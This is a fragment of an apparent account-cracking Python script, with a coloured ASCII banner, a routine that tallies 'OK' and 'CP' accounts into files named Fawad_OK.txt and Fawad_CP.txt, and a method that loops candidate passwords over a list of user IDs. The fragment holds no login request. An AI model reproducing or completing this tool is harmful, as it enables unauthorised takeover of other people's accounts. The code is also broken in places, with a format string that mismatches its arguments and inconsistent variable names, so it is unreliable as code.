...
logo =                                                  ''''
 \033[1;37      | |                   
\033[1;37 m   | |     _____   _____ 
  \033[1;37     | |    / _ \ \ / / _ \
   \033[1;37    | |___| (_) \ V /  __/
    \033[1;37    \_____/\___/ \_/ \___| 
\x1b[1;97m------------------------\x1b[1;97m------------------------
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mFawad_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mFawad_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back  Fawad Menu ")
	    Fawad()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Fawad] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
